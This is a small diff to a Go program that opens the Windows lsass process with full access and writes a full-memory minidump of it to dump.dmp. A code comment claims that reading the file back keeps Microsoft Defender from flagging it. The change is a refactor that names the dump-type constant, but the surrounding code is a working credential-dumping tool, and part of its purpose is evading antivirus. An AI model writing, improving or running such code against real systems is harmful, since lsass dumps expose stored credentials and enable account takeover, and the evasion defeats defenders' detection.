@@ -7,8 +7,11 @@ import (
 	"os"
 )
 
-const PROCESS_ALL_ACCESS = 0x1F0FFF
-const processEntrySize = 568
+const (
+	PROCESS_ALL_ACCESS     = 0x1F0FFF
+	processEntrySize       = 568
+	MiniDumpWithFullMemory = 0x00000002
+)
 
 var (
 	dbghelp                = windows.NewLazyDLL("dbghelp.dll")
@@ -36,7 +39,7 @@ func main() {
 	}
 	//Dump lsass with pid 0
 	fmt.Println("[*] Dump lsass")
-	miniDumpWriteDump(uintptr(lsassHandle), uintptr(0), uintptr(hFile), 0x00000002)
+	miniDumpWriteDump(uintptr(lsassHandle), uintptr(0), uintptr(hFile), MiniDumpWithFullMemory)
 	//It somehow prevents defender to flag the dump file
 	_, err = os.ReadFile("dump.dmp")
 	if err != nil {
